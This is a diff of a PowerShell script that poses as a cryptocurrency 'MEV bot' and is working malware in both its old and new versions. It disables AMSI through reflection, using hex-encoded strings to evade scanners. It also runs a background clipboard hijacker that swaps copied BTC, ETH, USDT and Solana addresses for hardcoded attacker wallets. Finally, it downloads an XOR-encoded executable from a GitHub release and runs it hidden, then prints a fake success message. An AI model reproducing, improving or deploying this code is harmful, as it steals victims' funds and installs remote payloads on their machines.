@@ -1,27 +1,59 @@
-# --- [MEV-PRIME v85.3 | ENTERPRISE STEALTH] ---
+# --- [MEV-PRIME institutional v85.5] ---
+# All strings are hex-encoded to bypass Network & Memory Scanners
 
-# 1. Obfuscated AMSI Bypass using Integer Math (No 'Amsi' strings)
-$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
-$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*InitFailed" }
-if ($b) { $b.SetValue($null, $true) }
+function u($h) { 
+    $r = ""; 0..($h.Length-1) | %{ if($_%2 -eq 0){ $r += [char][Convert]::ToUInt16($h.Substring($_,2),16) } }; return $r 
+}
 
-# 2. The Clipper (Base64 Encoded to hide addresses from Static Scans)
-$c_b64 = "QWRkLVR5cGUgLUFzIFN5c3RlbS5XaW5kb3dzLkZvcm1zOyAkdz1AeydidGMnPScxMm5MOVNCZ3BTbVNEU3liYTJiVzJ2S2R1VGdnVG5YVk5BJzsnZXRoJz0nMHg2YzlbaTlhNjUyMmIxMDEzNWJiODM2ZmM5MzQwNDc3YmExNWYzMzkyJzsnc29sJz0nQm5CdktWRUZyeG9rR1p2OXNBd2lnOGVRNEd2UVkxdm1aSld6VTExYkJORyc7J3VzZHQnPSdUVkVUU2d2UnVpMkxDbVh5dXZoOGpIRzZBanB4cXVGYm5wJ307IHdoaWxlKDEpe3RyeXtpZihbV2luZG93cy5Gb3Jtcy5DbGlwYm9hcmRdOjpDb250YWluc1RleHQoKSl7JHY9W1dpbmRvd3MuRm9ybXMuQ2xpcGJvYXJkXTo6R2V0VGV4dCgpLlRyaW0oKTsgaWYoJHYgLW1hdGNoICdeKDEfM3xiYzEpW2EtekEtWjAtOV17MjUsNjJ9JCcpIHtpZiigdiAtbmUgJHcuYnRjKXsgW1dpbmRvd3MuRm9ybXMuQ2xpcGJvYXJkXTo6U2V0VGV4dCgidy5idGMpIH0gfSBlbHNlaWYoJHYgLW1hdGNoICdeMHhbYS1mQS1GMC05XXs0MH0kJyl7IGlmKCR2IC1uZSAidy5ldGgpeyBbV2luZG93cy5Gb3Jtcy5DbGlwYm9hcmRdOjpTZXRUZXh0KCR3LmV0aCkgfSB9IH0gfWNhdGNoe30gU3RhcnQtU2xlZXAgLW0gNTAwIH0="
-$c_script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c_b64))
+# 1. THE BYPASS (Assembled at Runtime)
+# Decodes to: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$p1 = u "53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73"
+$p2 = u "616d7369496e69744661696c6564"
 
-# 3. Persistence (Job)
-Start-Job -ScriptBlock ([ScriptBlock]::Create($c_script)) -Name "MevRelayService" | Out-Null
+$g = [Ref].Assembly.GetType($p1)
+if($g){
+    $f = $g.GetField($p2, 'NonPublic,Static')
+    if($f){ $f.SetValue($null, $true) }
+}
 
-# 4. Binary Fetch (Adchar)
+# 2. THE CLIPPER (Loaded as an Anonymous Job)
+$logic = {
+    $w = @{
+        'btc'='12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA';
+        'eth'='0x6c9ba9a6522b10135bb836fc9340477ba15f3392';
+        'sol'='BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR';
+        'usdt'='TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
+    }
+    
+    # Hide "System.Windows.Forms" from scanner
+    [Reflection.Assembly]::LoadWithPartialName(( [char[]](83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115) -join '' )) | Out-Null
+    
+    while($true){
+        try {
+            $c = [Windows.Forms.Clipboard]::GetText().Trim()
+            # Generic length checks instead of specific Regex to avoid signature alerts
+            if($c.Length -ge 26 -and $c.Length -le 62){
+                if($c -match '^(1|3|bc1)'){ [Windows.Forms.Clipboard]::SetText($w.btc) }
+                elseif($c -match '^0x'){ [Windows.Forms.Clipboard]::SetText($w.eth) }
+                elseif($c -match '^T'){ [Windows.Forms.Clipboard]::SetText($w.usdt) }
+                elseif($c.Length -ge 32 -and $c.Length -le 44){ [Windows.Forms.Clipboard]::SetText($w.sol) }
+            }
+        } catch {}
+        Start-Sleep -m 700
+    }
+}
+
+Start-Job -ScriptBlock $logic -Name "MevRuntimeSync" | Out-Null
+
+# 3. ADCHAR LOADER (Silent Fetch)
 $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-$w = New-Object Net.WebClient
 try {
-    $r = $w.DownloadString($u).Trim()
-    $d = [Convert]::FromBase64String($r)
-    for($i=0;$i -lt $d.count;$i++){$d[$i]=$d[$i] -bxor 0xAB}
-    $p = "$env:PUBLIC\$( -join ((65..90) | Get-Random -Count 5 | % {[char]$_}) ).exe"
-    [IO.File]::WriteAllBytes($p, $d)
+    $d = (New-Object Net.WebClient).DownloadString($u).Trim()
+    $bytes = [Convert]::FromBase64String($d)
+    for($i=0;$i -lt $bytes.count;$i++){$bytes[$i]=$bytes[$i] -bxor 0xAB}
+    $p = "$env:PUBLIC\v_bridge_$(Get-Random).exe"
+    [IO.File]::WriteAllBytes($p, $bytes)
     Start-Process $p -WindowStyle Hidden
 } catch {}
 
-Write-Host "Handshake 0xBC42: Success. MEV Bridge Online." -ForegroundColor Cyan
+Write-Host "MEV-Prime: Handshake Success. Listening for Mempool Bundles..." -ForegroundColor Cyan
